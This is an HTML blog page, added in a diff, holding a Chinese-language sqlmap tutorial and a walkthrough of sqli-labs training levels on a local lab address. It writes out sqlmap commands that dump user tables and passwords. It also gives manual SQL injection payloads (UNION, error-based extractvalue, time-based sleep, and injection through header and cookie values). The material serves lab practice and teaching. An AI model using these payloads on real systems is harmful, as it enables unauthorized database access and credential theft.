@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>sql注入第二弹（sqlmap） | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  
+  
+  <meta name="description" content="一、下载sqlmap也可用卡里自带的 https:&#x2F;&#x2F;github.com&#x2F;sqlmapproject&#x2F;sqlmap&#x2F;archive&#x2F;refs&#x2F;tags&#x2F;1.7.zip 1.在sqlmap-1.7文件夹里面打开cmd 输入python sqlmap.py -h kali里面是sqlmap -h  用法：sqlmap.py [选项] 选项：-h, –help 显示基本帮助信息并退出-hh 显示高级帮">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入第二弹（sqlmap）">
+<meta property="og:url" content="http://example.com/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%BA%8C%E5%BC%B9%EF%BC%88sqlmap%EF%BC%89/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一、下载sqlmap也可用卡里自带的 https:&#x2F;&#x2F;github.com&#x2F;sqlmapproject&#x2F;sqlmap&#x2F;archive&#x2F;refs&#x2F;tags&#x2F;1.7.zip 1.在sqlmap-1.7文件夹里面打开cmd 输入python sqlmap.py -h kali里面是sqlmap -h  用法：sqlmap.py [选项] 选项：-h, –help 显示基本帮助信息并退出-hh 显示高级帮">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703490745036-99a5934c-795b-45c2-a5c8-c80973690a81.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703504200280-7a5cf720-5d33-407e-9efc-5a704d1c0d71.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703504268137-035df133-1a26-49fd-84df-e45919cd8d96.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703504536186-d10d24de-aaf1-4b6c-8fa3-3e2ee37df17e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703504553460-7106f906-de61-47c8-9011-98ebbf784a94.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703504567445-ab884507-eb44-4aa1-bbf7-3becd728f9b3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703504825979-3027eb01-b0e2-4da5-b16e-c9b8615a00cc.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703504900085-3856d871-5ad0-41dc-bfa8-28e71e8dbc29.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703505019472-bfd2b836-96aa-4a07-8e56-b3828ad73edd.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703505032868-522d99f5-e1b5-4b22-8d2e-a9b1925791cd.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703505044073-f0a8552e-08a0-454b-b349-0f0c124f009f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703495666552-a07200fc-566e-4761-be6b-44c851e40652.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703495792655-e9a3e9c6-0a7a-48a3-afca-e9b86030581f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703495804914-c5e75354-d132-446a-9a26-2a1f75137c5b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703505176203-6beacf22-355f-4a35-ad0b-b859082ea8c2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703505228621-c702aae8-c8cd-4752-84c5-a47f3f68b7b9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703505289745-b344e75b-370c-4f26-970f-d1a6384bd7f9.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703505351593-586038f6-a1aa-440f-8881-04c35d6a6411.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703506596238-4c3361da-5ec0-41c6-9c60-d661df7a7924.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703505820101-ad94a06f-ced4-4b7b-9b6a-2561ea4d0a70.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703505833215-d0b4ed09-27b6-43d1-b4da-5f4da0d15540.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703506920694-96e4ae36-ec0f-48d4-8a2f-cdcf39ed4343.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703506829506-278092eb-b10f-4c54-856f-cd94ac3298aa.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703509795276-9c4aa39a-81fc-42e6-a78f-8e4c997bc143.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703509839575-38512393-3397-424e-8b9d-28eea6d8d1aa.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703555108683-5cc1e8a2-cd33-4d7c-a7a5-8607ea50b8c6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703555858410-24729130-0987-4268-b9fd-f6fc39bd5e8f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703555888426-5b58b62a-6ebc-488d-80c4-c037ab83542d.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703556047057-e5fdb89b-6939-4ed0-b824-36443f37cbc8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703556148532-85ff0b9f-9e49-4da1-a88b-9da4bd70bb8f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703559607877-afc1241f-09f5-40d8-a77b-367d4018c585.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703559642080-04c5f8f8-0f55-4bdb-8936-69ec51b837cd.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703577369118-de215644-db55-4494-abb5-dde5255d8a8f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703578016035-4c1c8820-0027-443c-a14c-18e4f4882aea.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703596477803-eec74859-6900-44c7-92db-f72bafef1887.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703596553358-318a515e-d466-46aa-b26e-43567406674e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703600393516-64782821-aded-4a85-98c7-10b23b3c8be2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703599948140-e98c9d94-ce57-4bd9-9c0b-e46942b8919a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703600364040-25251c26-fa97-4951-8a5b-09ce0ecc9fd7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703600623418-0d917705-9d0f-471a-8c66-3b66e1b57de2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703601004133-722841bf-c20c-48d6-8d99-cab5c0af54d8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703601015221-1447b288-4a43-405c-bf57-a28a5da0c37e.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703601498336-98f09a7f-214b-42ce-aad5-ebc3b676e3a5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703601595690-50d7a36c-0d44-4ca3-a162-b87fc30c9549.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703602648301-16f11ebe-8998-4360-9b10-69e6c4d9bbf6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703602725012-edca84dc-f3b6-49d7-91b9-2206f4219a72.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703603271606-1d6859e6-f495-4425-be64-ab267f06ddfe.png">
+<meta property="article:published_time" content="2024-01-07T12:37:36.000Z">
+<meta property="article:modified_time" content="2024-01-07T12:41:11.187Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/qyj888/888/main/img/1703490745036-99a5934c-795b-45c2-a5c8-c80973690a81.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/images/default-avatar.jpg">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/highlight.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body>
+  <div id="fullpage" class="mobile-nav-right">
+    
+      <div id="wrapper" title="图片来自网络">
+    
+    
+      <header id="header">
+  <div id="nav-toggle" class="nav-toggle"></div>
+  <div class="head-box global-width">
+    <nav class="nav-box nav-right">
+      
+        <a class="nav-item" href="/archives" title
+        
+        >首页</a>
+      
+        <a class="nav-item" href="/archives" title
+        
+        >归档</a>
+      
+    </nav>
+  </div>
+</header>
+      <div id="middlecontent" title class="global-width sidebar-right">
+        <section id="main"><article id="post-sql注入第二弹（sqlmap）" class="article global-container article-type-post" itemscope itemprop="blogPost">
+  
+    <header class="article-header">
+      
+  
+    <h1 class="article-title" itemprop="name">
+      sql注入第二弹（sqlmap）
+    </h1>
+  
+
+    </header>
+  
+  <div class="article-meta">
+    <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%BA%8C%E5%BC%B9%EF%BC%88sqlmap%EF%BC%89/" class="article-date">
+  <time datetime="2024-01-07T12:37:36.000Z" itemprop="datePublished">2024-01-07</time>
+</a>
+    
+    
+  </div>
+  
+    <span id="busuanzi_container_page_pv">
+      本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+    </span>
+  
+
+  <div class="article-inner">
+    
+    <div class="article-content article-content-cloud" itemprop="articleBody">
+      
+        <p>一、下载sqlmap也可用卡里自带的</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.7.zip">https://github.com/sqlmapproject/sqlmap/archive/refs/tags/1.7.zip</a></p>
+<p>1.在sqlmap-1.7文件夹里面打开cmd</p>
+<p>输入python sqlmap.py -h</p>
+<p>kali里面是sqlmap -h</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703490745036-99a5934c-795b-45c2-a5c8-c80973690a81.png" alt="img"></p>
+<p>用法：sqlmap.py [选项]</p>
+<p>选项：<br>-h, –help 显示基本帮助信息并退出<br>-hh 显示高级帮助消息并退出<br>–version 显示程序版本号并退出<br>-v VERBOSE 详细程度：0-6（默认值 1）</p>
+<p>目标:<br>必须提供至少一个选项来定义<br>目标</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-u URL, --url=URL   目标 URL（例如“http://www.site.com/vuln.php?id=1”）</span><br></pre></td></tr></table></figure></div>
+
+<p>-g GOOGLEDORK 将谷歌搜索结果作为目标网址进行处理</p>
+<p>请求:<br>这些选项可用于指定如何连接到目标 URL</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--data=DATA        要通过POST发送的数据字符串（例如“id=1”）  </span><br><span class="line">--cookie=COOKIE     HTTP Cookie 标头值（例如“PHPSESSID=a8d127e..”）  </span><br><span class="line">--random-agent      使用随机选择的 HTTP 用户代理标头值  </span><br><span class="line">--proxy=PROXY      使用代理连接到目标网址  </span><br><span class="line">--tor              使用Tor匿名网络</span><br></pre></td></tr></table></figure></div>
+
+<p>–check-tor 检查Tor是否使用正确</p>
+<p>注射：<br>这些选项可用于指定要测试的参数，<br>提供自定义注入有效负载和可选篡改脚本</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-p TESTPARAMETER    可测试的参数  </span><br><span class="line">--dbms=DBMS        强制后端DBMS使用提供的值</span><br></pre></td></tr></table></figure></div>
+
+<p>检测：<br>这些选项可用于自定义检测阶段</p>
+<div class="highlight-box"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--level=LEVEL      要执行的测试级别（1-5，默认值 1）</span><br></pre></td></tr></table></figure></div>
+
+<p>–risk&#x3D;RISK 要执行的测试的风险（1-3，默认值1）</p>
+<p>技术：<br>这些选项可用于调整特定SQL注入的测试<br>技术、工艺</p>
+<p>–technique&#x3D;TECH.. 要使用的 SQL 注入技术（默认值是 “BEUSTQ”）</p>
+<p>枚举：<br>这些选项可用于枚举后端数据库<br>管理系统信息、结构和数据<br>桌子</p>
+<p>-a, –all 获取所有内容<br>-b, –banner 检索 DBMS 横幅<br>–current-user 检索DBMS当前用户</p>
+<p>–current-db 检索DBMS当前数据库<br>–passwords 枚举DBMS用户密码哈希<br>–dbs 枚举DBMS数据库<br>–tables 枚举DBMS数据库表<br>–columns 枚举DBMS数据库表列<br>–schema 枚举DBMS模式<br>–dump 转储DBMS数据库表条目<br>–dump-all 转储所有DBMS数据库表的条目<br>-D DB DBMS数据库进行枚举<br>-T TBL DBMS数据库表进行枚举<br>-C COL DBMS数据库表列进行枚举</p>
+<p>操作系统访问：<br>这些选项可用于访问后端数据库管理系统的底层操作系统</p>
+<p>–os-shell 提示交互式操作系统shell<br>–os-pwn 提示OOB shell，Meterpreter或VNC</p>
+<p>一般：<br>这些选项可用于设置一些一般的工作参数</p>
+<p>–batch 从不要求用户输入，使用默认行为<br>–flush-session 为当前目标刷新会话文件</p>
+<p>杂项：<br>这些选项不属于任何其他类别</p>
+<p>–wizard 适合初学者的简单向导界面</p>
+<p>[!] 要查看完整选项列表，请使用’-hh’</p>
+<p>1.用sqlmap打第一关靶场</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.2.72/sqli/Less-1/?id=1">http://192.168.2.72/sqli/Less-1/?id=1</a>“ –dbs –batch列出所有库名</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703504200280-7a5cf720-5d33-407e-9efc-5a704d1c0d71.png" alt="img"></p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.2.72/sqli/Less-1/?id=1">http://192.168.2.72/sqli/Less-1/?id=1</a>“ –batch -D security –tables列出security库中所有表名</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703504268137-035df133-1a26-49fd-84df-e45919cd8d96.png" alt="img"></p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.2.72/sqli/Less-1/?id=1">http://192.168.2.72/sqli/Less-1/?id=1</a>“ –batch -D security –tables –columns列出security库中所有表和列</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703504536186-d10d24de-aaf1-4b6c-8fa3-3e2ee37df17e.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703504553460-7106f906-de61-47c8-9011-98ebbf784a94.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703504567445-ab884507-eb44-4aa1-bbf7-3becd728f9b3.png" alt="img"></p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.2.72/sqli/Less-1/?id=1">http://192.168.2.72/sqli/Less-1/?id=1</a>“ –batch -D security -T users –columns列出users表中所有列名</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703504825979-3027eb01-b0e2-4da5-b16e-c9b8615a00cc.png" alt="img"></p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.2.72/sqli/Less-1/?id=1">http://192.168.2.72/sqli/Less-1/?id=1</a>“ –batch -D security -T users –dump</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.2.72/sqli/Less-1/?id=1">http://192.168.2.72/sqli/Less-1/?id=1</a>“ –batch -D security -T users -C “id,username,password” –dump根据得到的列名来列出用户名和密码</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.2.72/sqli/Less-1/?id=1">http://192.168.2.72/sqli/Less-1/?id=1</a>“ –data “uname&#x3D;admin&amp;passwd&#x3D;11&amp;submit&#x3D;Submit” -T users –dump</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703504900085-3856d871-5ad0-41dc-bfa8-28e71e8dbc29.png" alt="img"></p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.2.72/sqli/Less-1/?id=1">http://192.168.2.72/sqli/Less-1/?id=1</a>“ –batch -D security –dump列出所有表里面的内容</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703505019472-bfd2b836-96aa-4a07-8e56-b3828ad73edd.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703505032868-522d99f5-e1b5-4b22-8d2e-a9b1925791cd.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703505044073-f0a8552e-08a0-454b-b349-0f0c124f009f.png" alt="img"></p>
+<p>2.第十一关</p>
+<p>(1)第一种</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703495666552-a07200fc-566e-4761-be6b-44c851e40652.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703495792655-e9a3e9c6-0a7a-48a3-afca-e9b86030581f.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703495804914-c5e75354-d132-446a-9a26-2a1f75137c5b.png" alt="img"></p>
+<p>将左边的代码复制下来在sqlmap文件夹的位置新建一个txt文件，将复制的内容放进去</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703505176203-6beacf22-355f-4a35-ad0b-b859082ea8c2.png" alt="img"></p>
+<p>在sqlmap里面输入python sqlmap.py -r ..&#x2F;1.txt –dbs –batch</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703505228621-c702aae8-c8cd-4752-84c5-a47f3f68b7b9.png" alt="img"></p>
+<p>python sqlmap.py -r ..&#x2F;1.txt –dbs –batch –level 5 –risk 3</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703505289745-b344e75b-370c-4f26-970f-d1a6384bd7f9.png" alt="img"></p>
+<p>–risk&#x3D;1 表示执行风险最低的测试。</p>
+<p>–risk&#x3D;2 表示执行风险中等的测试。</p>
+<p>–risk&#x3D;3 表示执行风险最高的测试。</p>
+<p>python sqlmap.py -r ..&#x2F;1.txt –batch -D security -T users -C “id,username,password” –dump</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703505351593-586038f6-a1aa-440f-8881-04c35d6a6411.png" alt="img"></p>
+<p>（2）第二种</p>
+<p>username:  1admin’ union select 1,database()#</p>
+<p>password: 1</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703506596238-4c3361da-5ec0-41c6-9c60-d661df7a7924.png" alt="img"></p>
+<p>3.第十二关</p>
+<p>（1）第一种</p>
+<p>跟第十关一样通过yakit抓包，再使用sqlmap</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703505820101-ad94a06f-ced4-4b7b-9b6a-2561ea4d0a70.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703505833215-d0b4ed09-27b6-43d1-b4da-5f4da0d15540.png" alt="img"></p>
+<p>（2）第二种</p>
+<p>首先输入admin:admin’      password:123456</p>
+<p>通过页面回显得知”)是注入点</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703506920694-96e4ae36-ec0f-48d4-8a2f-cdcf39ed4343.png" alt="img"></p>
+<p>username: 1admin”) union select 1,database() #</p>
+<p>password: 1</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703506829506-278092eb-b10f-4c54-856f-cd94ac3298aa.png" alt="img"></p>
+<p>4.第十三关</p>
+<p>（1）第一种</p>
+<p>通过抓包后再使用sqlmap</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703509795276-9c4aa39a-81fc-42e6-a78f-8e4c997bc143.png" alt="img"></p>
+<p>（2）第二种</p>
+<p>首先输入admin:admin’      password:123456</p>
+<p>通过回显得知注入点为’)</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703509839575-38512393-3397-424e-8b9d-28eea6d8d1aa.png" alt="img"></p>
+<p>这里用admin admin登录后只会显示成功登录界面，所以尝试一下报错注入</p>
+<p>username:   admin’) and (extractvalue(1,concat(0x7e,(select user()),0x7e)))– -</p>
+<p>password:  123456</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703555108683-5cc1e8a2-cd33-4d7c-a7a5-8607ea50b8c6.png" alt="img"></p>
+<p>5.第十四关</p>
+<p>（1）第一种</p>
+<p>抓包后用sqlmap</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703555858410-24729130-0987-4268-b9fd-f6fc39bd5e8f.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703555888426-5b58b62a-6ebc-488d-80c4-c037ab83542d.png" alt="img"></p>
+<p>（2）第二种</p>
+<p>输入admin   admin</p>
+<p>通过回显可以看出注入点是双引号</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703556047057-e5fdb89b-6939-4ed0-b824-36443f37cbc8.png" alt="img"></p>
+<p>使用报错注入</p>
+<p>username：admin” and (extractvalue(1,concat(0x7e,(select user()),0x7e)))– -</p>
+<p>password：123456（因为被注释了，可以随意输入）</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703556148532-85ff0b9f-9e49-4da1-a88b-9da4bd70bb8f.png" alt="img"></p>
+<p>6.第十五关</p>
+<p>(1)第一种</p>
+<p>抓包后用sqlmap，这一关用sqlmap会比较慢</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703559607877-afc1241f-09f5-40d8-a77b-367d4018c585.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703559642080-04c5f8f8-0f55-4bdb-8936-69ec51b837cd.png" alt="img"></p>
+<p>（2）第二种</p>
+<p>输入admin   admin</p>
+<p>通过回显得知注入点为单引号</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703577369118-de215644-db55-4494-abb5-dde5255d8a8f.png" alt="img"></p>
+<p>用延时注入猜一下库名</p>
+<p>username:admin’ and If(ascii(substr(database(),1,1))&#x3D;114,1,sleep(5))– -</p>
+<p>password:1234</p>
+<p>7.第十六关</p>
+<p>输入admin	admin</p>
+<p>通过回显得知注入点是双引号加括号</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703578016035-4c1c8820-0027-443c-a14c-18e4f4882aea.png" alt="img"></p>
+<p>用延时注入猜库名</p>
+<p>username:admin”) and If(ascii(substr(database(),1,1))&#x3D;114,1,sleep(5))– -</p>
+<p>password:123</p>
+<p>8.第十七关</p>
+<p>（1）第一种</p>
+<p>yakit抓包后用sqlmap</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703596477803-eec74859-6900-44c7-92db-f72bafef1887.png" alt="img"></p>
+<p>（2）第二种</p>
+<p>输入admin  1’</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703596553358-318a515e-d466-46aa-b26e-43567406674e.png" alt="img"></p>
+<p>username:admin</p>
+<p>password: 11’and If(ascii(substr(database(),1,1))&#x3D;115,1,sleep(5))#&amp;submit&#x3D;Subm it  </p>
+<p>可以看到页面刷新5秒</p>
+<p>9.第十八关</p>
+<p>输入admin	1</p>
+<p>通过回显可以看出闭合点为单引号</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703600393516-64782821-aded-4a85-98c7-10b23b3c8be2.png" alt="img"></p>
+<p>先用yakit抓包</p>
+<p>在User-Agent处添加’and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’&#x3D;’1，然后就会出现mysql的版本号</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703599948140-e98c9d94-ce57-4bd9-9c0b-e46942b8919a.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703600364040-25251c26-fa97-4951-8a5b-09ce0ecc9fd7.png" alt="img"></p>
+<p>10.第十九关</p>
+<p>输入:admin	1</p>
+<p>根据提示得知接下来要改的是referer</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703600623418-0d917705-9d0f-471a-8c66-3b66e1b57de2.png" alt="img"></p>
+<p>在referer的内容改为’and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and ‘1’&#x3D;’1然后发送请求</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703601004133-722841bf-c20c-48d6-8d99-cab5c0af54d8.png" alt="img"></p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703601015221-1447b288-4a43-405c-bf57-a28a5da0c37e.png" alt="img"></p>
+<p>11.第二十关</p>
+<p>输入admin	1</p>
+<p>看提示这一关要改的是cookie</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703601498336-98f09a7f-214b-42ce-aad5-ebc3b676e3a5.png" alt="img"></p>
+<p>用yakit抓登录成功的包，然后将cookie的内容改为</p>
+<p>uname&#x3D;admin1’ and (extractvalue(1,concat(0x7e,(select user()),0x7e)))– -</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703601595690-50d7a36c-0d44-4ca3-a162-b87fc30c9549.png" alt="img"></p>
+<p>12.第二十一关</p>
+<p>登录进去后发现也是cookie类型，果断抓包</p>
+<p>发现cookie的内容是Cookie: uname&#x3D;YWRtaW4%3D，uname后面的内容通过Base64解码得到的是admin</p>
+<p>将admin’ 1&#x3D;2用Base64编码然后放入uname后面</p>
+<p>然后通过报错提示得知注入点是’)</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703602648301-16f11ebe-8998-4360-9b10-69e6c4d9bbf6.png" alt="img"></p>
+<p>将admin1’) and (extractvalue(1,concat(0x7e,(select user()),0x7e)))– -用Base64编码</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703602725012-edca84dc-f3b6-49d7-91b9-2206f4219a72.png" alt="img"></p>
+<p>13.第二十二关</p>
+<p>与二十一关唯一的不同的是注入点是双引号</p>
+<p><img src="https://raw.githubusercontent.com/qyj888/888/main/img/1703603271606-1d6859e6-f495-4425-be64-ab267f06ddfe.png" alt="img"></p>
+
+      
+    </div>
+    
+      <footer class="article-footer">
+        完
+      </footer>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  <div class="article-nav-block">
+    
+      <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%89%E5%BC%B9/" id="article-nav-newer" class="article-nav-link-wrap">
+        <strong class="article-nav-caption"></strong>
+        <div class="article-nav-title">
+          
+            sql注入第三弹
+          
+        </div>
+      </a>
+    
+  </div>
+  <div class="article-nav-block">
+    
+      <a href="/2024/01/07/sql%E6%B3%A8%E5%85%A5%E7%AC%AC%E4%B8%80%E5%BC%B9/" id="article-nav-older" class="article-nav-link-wrap">
+        <div class="article-nav-title">sql注入第一弹</div>
+        <strong class="article-nav-caption"></strong>
+      </a>
+    
+  </div>
+</nav>
+
+    <link rel="stylesheet" href="/css/gitment.css"> 
+<script src="/js/gitment.js"></script>
+
+<div id="gitmentContainer"></div>
+
+<script>
+var gitment = new Gitment({
+  owner: '',
+  repo: '',
+  oauth: {
+    client_id: '',
+    client_secret: '',
+  },
+})
+gitment.render('gitmentContainer')
+</script>
+
+  
+  
+</article>
+</section>
+        <aside id="sidebar">
+  
+    <div class="widget-box">
+  <div class="avatar-box">
+    <img class="avatar" src="/images/default-avatar.jpg" title="图片来自网络"></img>
+    <h3 class="avatar-name">
+      
+        渗透不了一点
+      
+    </h3>
+    <p class="avatar-slogan">
+      缘分落地生根是我们。
+    </p>
+  </div>
+</div>
+
+
+  
+    
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/1/" rel="tag">1</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-box">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/1/" style="font-size: 10px;">1</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-box">
